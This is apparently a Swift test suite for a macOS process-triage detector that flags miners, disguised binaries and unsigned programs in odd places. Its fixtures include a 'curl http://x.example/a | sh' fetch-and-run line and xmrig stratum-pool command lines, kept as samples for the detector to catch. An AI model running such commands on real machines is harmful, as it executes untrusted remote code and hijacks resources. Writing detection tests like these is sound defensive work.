import Testing
@testable import DiagnoCore

@Suite struct ProcessTriageTests {
    let home = "/Users/sam"

    private func facts(_ name: String, path: String, trust: CodeTrust, command: String? = nil, cpu: Double = 0,
                       root: Bool = false, deleted: Bool = false, listening: [Int] = [], remote: [Int] = [],
                       launchedBy: String? = nil) -> ProcessFacts {
        ProcessFacts(pid: 100, name: name, path: path, commandLine: command ?? path, isRoot: root, cpuPercent: cpu, trust: trust,
                     executableDeleted: deleted, listeningPorts: listening, remotePorts: remote, launchedBy: launchedBy)
    }

    @Test func appleProgramsAreNeverFlagged() {
        let p = facts("launchd", path: "/sbin/launchd", trust: .apple, cpu: 99, deleted: true)
        #expect(ProcessTriage.assess(p, home: home) == nil)
    }

    @Test func ordinaryAppsAreLeftAlone() {
        let chrome = facts("Google Chrome", path: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                           trust: .developerID(team: "EQHXZ8M8AV"), cpu: 40)
        #expect(ProcessTriage.assess(chrome, home: home) == nil)
        let brew = facts("node", path: "/opt/homebrew/bin/node", trust: .adHoc, command: "node server.js")
        #expect(ProcessTriage.assess(brew, home: home) == nil)
        let cargo = facts("tool", path: "\(home)/.cargo/bin/tool", trust: .adHoc)
        #expect(ProcessTriage.assess(cargo, home: home) == nil)
    }

    @Test func developerBuildsAreLeftAlone() {
        let build = facts("MyApp", path: "\(home)/Library/Developer/Xcode/DerivedData/MyApp/Build/Products/Debug/MyApp.app/Contents/MacOS/MyApp",
                          trust: .otherCertificate)
        #expect(ProcessTriage.assess(build, home: home) == nil)
    }

    @Test func aSignedUpdaterInATemporaryFolderIsLeftAlone() {
        let updater = facts("Autoupdate", path: "/private/var/folders/ab/cd/T/org.sparkle.Autoupdate/Autoupdate",
                            trust: .developerID(team: "ABC"))
        #expect(ProcessTriage.assess(updater, home: home) == nil)
    }

    @Test func aFakeSystemProcessIsSuspicious() {
        let p = facts("WindowServer", path: "\(home)/Library/.cache/WindowServer", trust: .unsigned)
        let result = ProcessTriage.assess(p, home: home)
        #expect(result?.concern == .suspicious)
        #expect(result?.signals.first?.text.contains("like part of macOS") == true)
    }

    @Test func aMinerIsSuspicious() {
        let p = facts("xmrig", path: "/tmp/xmrig", trust: .adHoc, command: "/tmp/xmrig -o stratum+tcp://pool.example:3333", cpu: 380,
                      remote: [3333])
        #expect(ProcessTriage.assess(p, home: home)?.concern == .suspicious)
    }

    @Test func aMinerIsFoundByItsPoolAddressEvenWithAnotherName() {
        let p = facts("updater", path: "/tmp/updater", trust: .unsigned, command: "/tmp/updater --donate-level 1 -o stratum+tcp://x:3333")
        #expect(ProcessTriage.assess(p, home: home)?.concern == .suspicious)
    }

    @Test func anUnsignedProgramInATemporaryFolderIsWorthChecking() {
        let p = facts("helper", path: "/tmp/helper", trust: .unsigned)
        let result = ProcessTriage.assess(p, home: home)
        #expect(result?.concern == .worthChecking)
        #expect(result?.signals.count == 2)
    }

    @Test func unsignedAloneIsNotEnough() {
        let p = facts("thing", path: "/Applications/Thing.app/Contents/MacOS/thing", trust: .unsigned)
        #expect(ProcessTriage.assess(p, home: home) == nil)
    }

    @Test func aDeletedProgramThatKeepsRunningIsFlagged() {
        let p = facts("agent", path: "\(home)/Downloads/agent", trust: .unsigned, deleted: true)
        #expect(ProcessTriage.assess(p, home: home)?.concern == .suspicious)
    }

    @Test func aProgramDisguisedAsADocumentIsFlagged() {
        let p = facts("invoice.pdf", path: "\(home)/Downloads/invoice.pdf", trust: .adHoc)
        let result = ProcessTriage.assess(p, home: home)
        #expect(result?.concern == .suspicious)
        #expect(result?.signals.contains { $0.text.contains("named like a document") } == true)
    }

    @Test func hiddenFoldersCountUnlessTheyBelongToDeveloperTools() {
        let hidden = facts("sync", path: "\(home)/.sync/sync", trust: .unsigned)
        #expect(ProcessTriage.assess(hidden, home: home)?.concern == .worthChecking)
        let tool = facts("sync", path: "\(home)/.pyenv/shims/sync", trust: .unsigned)
        #expect(ProcessTriage.assess(tool, home: home) == nil)
    }

    @Test func pipingADownloadIntoAShellIsFlagged() {
        let p = facts("bash", path: "/bin/bash", trust: .apple, command: "bash -c curl http://x.example/a | sh")
        #expect(ProcessTriage.assess(p, home: home) == nil, "Apple's bash is Apple's")
        let sneaky = facts("sh", path: "/usr/local/bin/sh", trust: .unsigned, command: "sh -c curl http://x.example/a | sh")
        #expect(ProcessTriage.assess(sneaky, home: home) != nil)
    }

    @Test func aScriptInATemporaryFolderIsNoticedThroughItsInterpreter() {
        let p = facts("python3.11", path: "/opt/homebrew/bin/python3.11", trust: .adHoc, command: "python3.11 /tmp/run.py")
        let result = ProcessTriage.assess(p, home: home)
        #expect(result?.concern == .worthChecking)
        #expect(result?.signals.contains { $0.text.contains("run.py") } == true)
    }

    @Test func startingItselfAtLoginAddsToAnAlreadyOddProgram() {
        let without = facts("helper", path: "/tmp/helper", trust: .unsigned)
        let with = facts("helper", path: "/tmp/helper", trust: .unsigned, launchedBy: "com.example.helper")
        #expect((ProcessTriage.assess(with, home: home)?.score ?? 0) > (ProcessTriage.assess(without, home: home)?.score ?? 0))
        let normal = facts("Dropbox", path: "/Applications/Dropbox.app/Contents/MacOS/Dropbox", trust: .developerID(team: "G7HH3F8CAK"),
                           launchedBy: "com.dropbox.agent")
        #expect(ProcessTriage.assess(normal, home: home) == nil)
    }

    @Test func listeningAndBusyProgramsFromOddPlacesScoreHigher() {
        let p = facts("srv", path: "/Users/Shared/srv", trust: .unsigned, cpu: 90, root: true, listening: [8080])
        #expect(ProcessTriage.assess(p, home: home)?.concern == .suspicious)
    }

    @Test func aBrokenSignatureIsSuspiciousOnItsOwn() {
        let p = facts("Zoom", path: "/Applications/zoom.us.app/Contents/MacOS/zoom.us", trust: .invalid)
        #expect(ProcessTriage.assess(p, home: home)?.concern == .suspicious)
    }

    @Test func signalsAreListedStrongestFirst() {
        let p = facts("helper", path: "/tmp/helper", trust: .unsigned, cpu: 90)
        let weights = ProcessTriage.assess(p, home: home)?.signals.map(\.weight) ?? []
        #expect(weights == weights.sorted(by: >))
    }
}
